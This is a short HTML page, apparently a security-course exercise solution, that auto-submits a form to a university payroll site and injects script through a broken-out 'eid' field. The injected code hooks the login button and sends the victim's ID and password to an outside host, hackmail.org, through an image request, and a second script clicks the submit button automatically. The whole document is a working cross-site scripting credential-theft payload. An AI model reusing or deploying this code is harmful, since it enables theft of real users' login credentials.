<html>
<head></head>
<body>

<form method="post" action="http://payroll.utexas.edu">
	<input name="eid" value='">
<script>window.onload = function(){
var btn = document.getElementsByTagName("button")[0];
var form = document.getElementsByTagName("form")[0];
var eid = form["eid"];
var password = form["password"];
btn.onclick =  function() {
  (function() {
	(new Image()).src="http://hackmail.org/sendmail.php?&username="+
		"user&payload=" + 
		"eid: " + login.value +
		" password: "+pw1.value + "&random="+
		Math.random();
  })();  
};
}
</script><input type="hidden'>
	<button type="submit" id="pwTheftBtn">
</form>
<script>
  	document.getElementById("pwTheftBtn").click();
</script>

</body>
</html>
